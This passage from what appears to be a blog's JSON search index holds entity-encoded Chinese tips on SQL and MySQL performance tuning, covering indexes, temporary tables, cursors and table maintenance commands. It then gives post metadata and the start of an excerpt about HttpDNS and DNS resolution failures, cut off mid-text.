&#x65F6;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x91CD;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x6240;&#x4EE5;&#x600E;&#x6837;&#x5EFA;&#x7D22;&#x5F15;&#x9700;&#x8981;&#x614E;&#x91CD;&#x8003;&#x8651;&#xFF0C;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x6570;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; 6 &#x4E2A;&#xFF0C;&#x82E5;&#x592A;&#x591A;&#x5219;&#x5E94;&#x8003;&#x8651;&#x4E00;&#x4E9B;&#x4E0D;&#x5E38;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x5426;&#x6709;&#x5FC5;&#x8981;&#x3002; 16&#x3001;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x907F;&#x514D;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C; &#x56E0;&#x4E3A; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#x7684;&#x987A;&#x5E8F;&#x5C31;&#x662F;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x7269;&#x7406;&#x5B58;&#x50A8;&#x987A;&#x5E8F;&#xFF0C;&#x4E00;&#x65E6;&#x8BE5;&#x5217;&#x503C;&#x6539;&#x53D8;&#x5C06;&#x5BFC;&#x81F4;&#x6574;&#x4E2A;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x987A;&#x5E8F;&#x7684;&#x8C03;&#x6574;&#xFF0C;&#x4F1A;&#x8017;&#x8D39;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x82E5;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x9891;&#x7E41;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x8003;&#x8651;&#x662F;&#x5426;&#x5E94;&#x5C06;&#x8BE5;&#x7D22;&#x5F15;&#x5EFA;&#x4E3A; clustered &#x7D22;&#x5F15;&#x3002; 17&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x578B;&#x5B57;&#x6BB5;&#xFF0C;&#x82E5;&#x53EA;&#x542B;&#x6570;&#x503C;&#x4FE1;&#x606F;&#x7684;&#x5B57;&#x6BB5;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x8BBE;&#x8BA1;&#x4E3A;&#x5B57;&#x7B26;&#x578B;&#xFF0C;&#x8FD9;&#x4F1A;&#x964D;&#x4F4E;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5E76; &#x4F1A;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5F00;&#x9500;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5F15;&#x64CE;&#x5728;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x65F6;&#x4F1A;&#x9010;&#x4E2A;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6570;&#x5B57;&#x578B;&#x800C;&#x8A00; &#x53EA;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x4E00;&#x6B21;&#x5C31;&#x591F;&#x4E86;&#x3002; 18&#x3001;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x4F7F;&#x7528; varchar/nvarchar &#x4EE3;&#x66FF; char/nchar , &#x56E0;&#x4E3A;&#x9996;&#x5148;&#x53D8;&#x957F;&#x5B57;&#x6BB5;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x5C0F;&#xFF0C; &#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C; &#x5176;&#x6B21;&#x5BF9;&#x4E8E;&#x67E5;&#x8BE2;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#x7684;&#x5B57;&#x6BB5;&#x5185;&#x641C;&#x7D22;&#x6548;&#x7387;&#x663E;&#x7136;&#x8981;&#x9AD8;&#x4E9B;&#x3002; 19&#x3001;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x90FD;&#x4E0D;&#x8981;&#x4F7F;&#x7528; select from t ,&#x7528;&#x5177;&#x4F53;&#x7684;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#x4EE3;&#x66FF;&#x201C;&#x201D;,&#x4E0D;&#x8981;&#x8FD4;&#x56DE;&#x7528;&#x4E0D;&#x5230;&#x7684;&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#x3002; 20&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x8868;&#x53D8;&#x91CF;&#x6765;&#x4EE3;&#x66FF;&#x4E34;&#x65F6;&#x8868;&#x3002;&#x5982;&#x679C;&#x8868;&#x53D8;&#x91CF;&#x5305;&#x542B;&#x5927;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&#x7D22;&#x5F15;&#x975E;&#x5E38;&#x6709;&#x9650;(&#x53EA;&#x6709;&#x4E3B;&#x952E;&#x7D22;&#x5F15;)&#x3002; 21&#x3001;&#x907F;&#x514D;&#x9891;&#x7E41;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x4EE5;&#x51CF;&#x5C11;&#x7CFB;&#x7EDF;&#x8868;&#x8D44;&#x6E90;&#x7684;&#x6D88;&#x8017;&#x3002; 22&#x3001;&#x4E34;&#x65F6;&#x8868;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#xFF0C;&#x9002;&#x5F53;&#x5730;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x67D0;&#x4E9B;&#x4F8B;&#x7A0B;&#x66F4;&#x6709;&#x6548;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x91CD;&#x590D;&#x5F15;&#x7528;&#x5927;&#x578B;&#x8868;&#x6216;&#x5E38;&#x7528; &#x8868;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x65F6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x6B21;&#x6027;&#x4E8B;&#x4EF6;&#xFF0C; &#x6700;&#x597D;&#x4F7F;&#x7528;&#x5BFC;&#x51FA;&#x8868;&#x3002; 23&#x3001;&#x5728;&#x65B0;&#x5EFA;&#x4E34;&#x65F6;&#x8868;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x6B21;&#x6027;&#x63D2;&#x5165;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; select into &#x4EE3;&#x66FF; create table,&#x907F;&#x514D;&#x9020;&#x6210;&#x5927;&#x91CF; log ,&#x4EE5;&#x63D0;&#x9AD8;&#x901F;&#x5EA6;;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x5927;&#xFF0C;&#x4E3A;&#x4E86;&#x7F13;&#x548C;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x5E94;&#x5148; create table,&#x7136;&#x540E; insert&#x3001; 24&#x3001;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x5230;&#x4E86;&#x4E34;&#x65F6;&#x8868;&#xFF0C; &#x5728;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x6700;&#x540E;&#x52A1;&#x5FC5;&#x5C06;&#x6240;&#x6709;&#x7684;&#x4E34;&#x65F6;&#x8868;&#x663E;&#x5F0F;&#x5220;&#x9664;&#xFF0C; &#x5148; truncate table ,&#x7136;&#x540E; drop table ,&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8F83;&#x957F;&#x65F6;&#x95F4;&#x9501;&#x5B9A;&#x3002; 25&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#xFF0C;&#x56E0;&#x4E3A;&#x6E38;&#x6807;&#x7684;&#x6548;&#x7387;&#x8F83;&#x5DEE;&#xFF0C;&#x5982;&#x679C;&#x6E38;&#x6807;&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x8D85;&#x8FC7; 1 &#x4E07;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x6539;&#x5199;&#x3002; 26&#x3001;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x6216;&#x4E34;&#x65F6;&#x8868;&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#xFF0C;&#x5E94;&#x5148;&#x5BFB;&#x627E;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x6765;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x901A;&#x5E38;&#x66F4; &#x6709;&#x6548;&#x3002; 27&#x3001;&#x4E0E;&#x4E34;&#x65F6;&#x8868;&#x4E00;&#x6837;&#xFF0C;&#x6E38;&#x6807;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#x3002;&#x5BF9;&#x5C0F;&#x578B;&#x6570;&#x636E;&#x96C6;&#x4F7F;&#x7528; FAST_FORWARD &#x6E38;&#x6807;&#x901A;&#x5E38;&#x8981;&#x4F18;&#x4E8E;&#x5176;&#x4ED6;&#x9010;&#x884C;&#x5904;&#x7406;&#x65B9;&#x6CD5;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x5FC5;&#x987B;&#x5F15;&#x7528;&#x51E0;&#x4E2A;&#x8868;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6240;&#x9700;&#x7684;&#x6570;&#x636E;&#x65F6;&#x3002;&#x5728;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x5305;&#x62EC;&#x201C;&#x5408;&#x8BA1;&#x201D;&#x7684;&#x4F8B;&#x7A0B;&#x901A;&#x5E38;&#x8981;&#x6BD4;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#x6267;&#x884C;&#x7684;&#x901F;&#x5EA6;&#x5FEB;&#x3002;&#x5982;&#x679C;&#x5F00;&#x53D1;&#x65F6;&#x95F4;&#x5141;&#x8BB8;&#xFF0C;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x548C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x770B;&#x54EA;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x7684;&#x6548;&#x679C;&#x66F4;&#x597D;&#x3002; 28&#x3001;&#x5728;&#x6240;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x5F00;&#x59CB;&#x5904;&#x8BBE;&#x7F6E; SET NOCOUNT ON ,&#x5728;&#x7ED3;&#x675F;&#x65F6;&#x8BBE;&#x7F6E; SET NOCOUNT OFF &#x3001;&#x65E0;&#x9700;&#x5728;&#x6267;&#x884C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x6BCF;&#x4E2A;&#x8BED;&#x53E5;&#x540E;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; DONE_IN_PROC &#x6D88;&#x606F;&#x3002; 29&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5927;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x5E76;&#x53D1;&#x80FD;&#x529B;&#x3002; sql &#x4F18;&#x5316;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6765;&#x66F4;&#x5FEB;&#x5730;&#x904D;&#x5386;&#x8868;&#x3002; &#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#x5EFA;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x5B83;&#x5E76;&#x4E0D;&#x662F;&#x6700;&#x4F73;&#x7684;&#x3002;&#x5728;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5728;&#x7269;&#x7406;&#x4E0A;&#x968F;&#x673A;&#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x9875;&#x4E0A;&#x3002;&#x5408;&#x7406;&#x7684;&#x7D22;&#x5F15;&#x8BBE;&#x8BA1;&#x8981;&#x5EFA;&#x7ACB;&#x5728;&#x5BF9;&#x5404;&#x79CD;&#x67E5;&#x8BE2;&#x7684;&#x5206;&#x6790;&#x548C;&#x9884;&#x6D4B;&#x4E0A;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF1A; a&#x3001;&#x6709;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#x3001;&#x4E14;&#x7ECF;&#x5E38;&#x6709;&#x8303;&#x56F4;&#x67E5;&#x8BE2;( &gt; ,&lt; ,&gt; =,&lt; =)&#x548C; order by&#x3001;group by &#x53D1;&#x751F;&#x7684;&#x5217;&#xFF0C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x96C6;&#x7FA4;&#x7D22;&#x5F15;; b&#x3001;&#x7ECF;&#x5E38;&#x540C;&#x65F6;&#x5B58;&#x53D6;&#x591A;&#x5217;&#xFF0C;&#x4E14;&#x6BCF;&#x5217;&#x90FD;&#x542B;&#x6709;&#x91CD;&#x590D;&#x503C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x7EC4;&#x5408;&#x7D22;&#x5F15;; c&#x3001;&#x7EC4;&#x5408;&#x7D22;&#x5F15;&#x8981;&#x5C3D;&#x91CF;&#x4F7F;&#x5173;&#x952E;&#x67E5;&#x8BE2;&#x5F62;&#x6210;&#x7D22;&#x5F15;&#x8986;&#x76D6;&#xFF0C;&#x5176;&#x524D;&#x5BFC;&#x5217;&#x4E00;&#x5B9A;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x9891;&#x7E41;&#x7684;&#x5217;&#x3002;&#x7D22;&#x5F15;&#x867D;&#x6709;&#x52A9;&#x4E8E;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x4F46; &#x4E0D;&#x662F;&#x7D22;&#x5F15;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x6070;&#x597D;&#x76F8;&#x53CD;&#x8FC7;&#x591A;&#x7684;&#x7D22;&#x5F15;&#x4F1A;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x4F4E;&#x6548;&#x3002;&#x7528;&#x6237;&#x5728;&#x8868;&#x4E2D;&#x6BCF;&#x52A0;&#x8FDB;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#xFF0C;&#x7EF4;&#x62A4;&#x7D22;&#x5F15;&#x96C6;&#x5408;&#x5C31; &#x8981;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x66F4;&#x65B0;&#x5DE5;&#x4F5C;&#x3002; 30&#x3001;&#x5B9A;&#x671F;&#x5206;&#x6790;&#x8868;&#x548C;&#x68C0;&#x67E5;&#x8868;&#x3002;1&#x5206;&#x6790;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name[, tbl_name]&#x3001;&#x3001;&#x3001; &#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x548C;&#x5B58;&#x50A8;&#x8868;&#x7684;&#x5173;&#x952E;&#x5B57;&#x5206;&#x5E03;&#xFF0C;&#x5206;&#x6790;&#x7684;&#x7ED3;&#x679C;&#x5C06;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x7CFB;&#x7EDF;&#x5F97;&#x5230;&#x51C6;&#x786E;&#x7684;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x5F97;SQL&#x80FD;&#x591F;&#x751F;&#x6210;&#x6B63;&#x786E;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x3002;&#x5982;&#x679C;&#x7528;&#x6237;&#x611F;&#x89C9;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x5E76;&#x4E0D;&#x662F;&#x9884;&#x671F;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x8868;&#x53EF;&#x80FD;&#x4F1A;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x3002;&#x5728;&#x5206;&#x6790;&#x671F;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8BFB;&#x53D6;&#x9501;&#x5B9A;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#x3002;&#x8FD9;&#x5BF9;&#x4E8E;MyISAM&#xFF0C;DBD&#x548C;InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#x3002;12&#x4F8B;&#x5982;&#x5206;&#x6790;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF1A;analyze table table_name&#x68C0;&#x67E5;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;CHECK TABLE tb1_name[,tbl_name]&#x3001;&#x3001;&#x3001;[option]&#x3001;&#x3001;&#x3001;option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED} &#x68C0;&#x67E5;&#x8868;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8868;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;CHECK TABLE &#x5BF9;MyISAM &#x548C; InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x4E8E;MyISAM&#x8868;&#xFF0C;&#x5173;&#x952E;&#x5B57;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x88AB;&#x66F4;&#x65B0; CHECK TABLE &#x4E5F;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x89C6;&#x56FE;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x4E2D;&#x88AB;&#x5F15;&#x7528;&#x7684;&#x8868;&#x4E0D;&#x5B58;&#x5728;&#x3002; 31&#x3001;&#x5B9A;&#x671F;&#x4F18;&#x5316;&#x8868;&#x3002;1&#x4F18;&#x5316;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name [,tbl_name]&#x3001;&#x3001;&#x3001; &#x5982;&#x679C;&#x5220;&#x9664;&#x4E86;&#x8868;&#x7684;&#x4E00;&#x5927;&#x90E8;&#x5206;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x5BF9;&#x542B;&#x6709;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x884C;&#x7684;&#x8868;(&#x542B;&#x6709; VARCHAR&#x3001;BLOB&#x6216;TEXT&#x5217;&#x7684;&#x8868;)&#x8FDB;&#x884C;&#x66F4;&#x591A;&#x66F4;&#x6539;&#xFF0C;&#x5219;&#x5E94;&#x4F7F;&#x7528;OPTIMIZE TABLE&#x547D;&#x4EE4;&#x6765;&#x8FDB;&#x884C;&#x8868;&#x4F18;&#x5316;&#x3002;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x8868;&#x4E2D;&#x7684;&#x7A7A;&#x95F4;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x6D88;&#x9664;&#x7531;&#x4E8E;&#x5220;&#x9664;&#x6216;&#x8005;&#x66F4;&#x65B0;&#x9020;&#x6210;&#x7684;&#x7A7A;&#x95F4;&#x6D6A;&#x8D39;&#xFF0C;&#x4F46;OPTIMIZE TABLE &#x547D;&#x4EE4;&#x53EA;&#x5BF9;MyISAM&#x3001; BDB &#x548C;InnoDB&#x8868;&#x8D77;&#x4F5C;&#x7528;&#x3002;1&#x4F8B;&#x5982;&#xFF1A; optimize table table_name &#x6CE8;&#x610F;&#xFF1A; analyze&#x3001;check&#x3001;optimize&#x6267;&#x884C;&#x671F;&#x95F4;&#x5C06;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#xFF0C;&#x56E0;&#x6B64;&#x4E00;&#x5B9A;&#x6CE8;&#x610F;&#x8981;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x7E41;&#x5FD9;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#x3002; &#x8865;&#x5145;&#xFF1A;1&#x3001;&#x5728;&#x6D77;&#x91CF;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x5C11;&#x7528;&#x683C;&#x5F0F;&#x8F6C;&#x6362;&#x3002;2&#x3001;ORDER BY &#x548C; GROPU BY:&#x4F7F;&#x7528; ORDER BY &#x548C; GROUP BY &#x77ED;&#x8BED;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x79CD;&#x7D22;&#x5F15;&#x90FD;&#x6709;&#x52A9;&#x4E8E; SELECT &#x7684;&#x6027;&#x80FD;&#x63D0;&#x9AD8;&#x3002;3&#x3001;&#x4EFB;&#x4F55;&#x5BF9;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x5C06;&#x5BFC;&#x81F4;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5B83;&#x5305;&#x62EC;&#x6570;&#x636E;&#x5E93;&#x6559;&#x7A0B;&#x51FD;&#x6570;&#x3001;&#x8BA1;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;&#x7B49;&#x7B49;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x5C06;&#x64CD;&#x4F5C;&#x79FB; &#x81F3;&#x7B49;&#x53F7;&#x53F3;&#x8FB9;&#x3002;4&#x3001;IN&#x3001;OR &#x5B50;&#x53E5;&#x5E38;&#x4F1A;&#x4F7F;&#x7528;&#x5DE5;&#x4F5C;&#x8868;&#xFF0C;&#x4F7F;&#x7D22;&#x5F15;&#x5931;&#x6548;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x4EA7;&#x751F;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x628A;&#x5B50;&#x53E5;&#x62C6;&#x5F00;&#x3002;&#x62C6;&#x5F00;&#x7684;&#x5B50; &#x53E5;&#x4E2D;&#x5E94;&#x8BE5;&#x5305;&#x542B;&#x7D22;&#x5F15;&#x3002;5&#x3001;&#x53EA;&#x8981;&#x80FD;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x66F4;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF1A;&#x4F8B;&#x5982;&#x4F7F;&#x7528; MEDIUMINT &#x4EE3;&#x66FF; INT6&#x3001;&#x5C3D;&#x91CF;&#x628A;&#x6240;&#x6709;&#x7684;&#x5217;&#x8BBE;&#x7F6E;&#x4E3A; NOT NULL,&#x5982;&#x679C;&#x4F60;&#x8981;&#x4FDD;&#x5B58; NULL,&#x624B;&#x52A8;&#x53BB;&#x8BBE;&#x7F6E;&#x5B83;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x628A;&#x5B83;&#x8BBE;&#x4E3A;&#x9ED8;&#x8BA4;&#x503C;&#x3002;7&#x3001;&#x5C3D;&#x91CF;&#x5C11;&#x7528; VARCHAR&#x3001;TEXT&#x3001;BLOB &#x7C7B;&#x578B;8&#x3001;&#x5982;&#x679C;&#x4F60;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4F60;&#x6240;&#x77E5;&#x7684;&#x5C11;&#x91CF;&#x7684;&#x51E0;&#x4E2A;&#x3002;&#x6700;&#x597D;&#x4F7F;&#x7528; ENUM &#x7C7B;&#x578B;9&#x3001;&#x6B63;&#x5982; graymice &#x6240;&#x8BB2;&#x7684;&#x90A3;&#x6837;&#xFF0C;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;10&#x3001;&#x5408;&#x7406;&#x7528;&#x8FD0;&#x5206;&#x8868;&#x4E0E;&#x5206;&#x533A;&#x8868;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x5B58;&#x653E;&#x548C;&#x63D0;&#x53D6;&#x901F;&#x5EA6;&#x3002;","raw":null,"content":null,"categories":[{"name":"我的收藏","slug":"我的收藏","permalink":"http://www.wangxin123.com/categories/我的收藏/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://www.wangxin123.com/tags/MySQL/"},{"name":"性能调优","slug":"性能调优","permalink":"http://www.wangxin123.com/tags/性能调优/"}]},{"title":"全局精确流量调度新思路-HttpDNS服务详解","slug":"全局精确流量调度新思路-HttpDNS服务详解","date":"2016-05-26T14:22:00.000Z","updated":"2016-11-17T11:59:42.679Z","comments":true,"path":"2016/05/26/全局精确流量调度新思路-HttpDNS服务详解/","link":"","permalink":"http://www.wangxin123.com/2016/05/26/全局精确流量调度新思路-HttpDNS服务详解/","excerpt":"&#x4F46;&#x51E1;&#x4F7F;&#x7528;&#x57DF;&#x540D;&#x6765;&#x7ED9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x5730;&#x65E0;&#x6CD5;&#x907F;&#x514D;&#x5728;&#x6709;&#x4E2D;&#x56FD;&#x7279;&#x8272;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E2D;&#x906D;&#x9047;&#x5230;&#x5404;&#x79CD;&#x57DF;&#x540D;&#x88AB;&#x7F13;&#x5B58;&#x3001;&#x7528;&#x6237;&#x8DE8;&#x7F51;&#x8BBF;&#x95EE;&#x7F13;&#x6162;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x6837;&#x7684;&#x57DF;&#x540D;&#x6570;&#x91CF;&#x5728;10&#x4E07;&#x7EA7;&#x522B;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x6765;&#x8BB2;&#xFF0C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x5230;&#x5E95;&#x6709;&#x591A;&#x4E25;&#x91CD;&#x5462;&#xFF1F;&#x6BCF;&#x5929;&#x817E;&#x8BAF;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x76D1;&#x6D4B;&#x7CFB;&#x7EDF;&#x5728;&#x4E0D;&#x505C;&#x5730;&#x5BF9;&#x5168;&#x56FD;&#x6240;&#x6709;&#x7684;&#x91CD;&#x70B9;LocalDNS&#x8FDB;&#x884C;&#x63A2;&#x6D4B;&#xFF0C;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x5728;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x65E5;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x91CF;&#x662F;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E86;80&#x4E07;&#x6761;&#x3002;&#x8FD9;&#x7ED9;&#x817E;&#x8B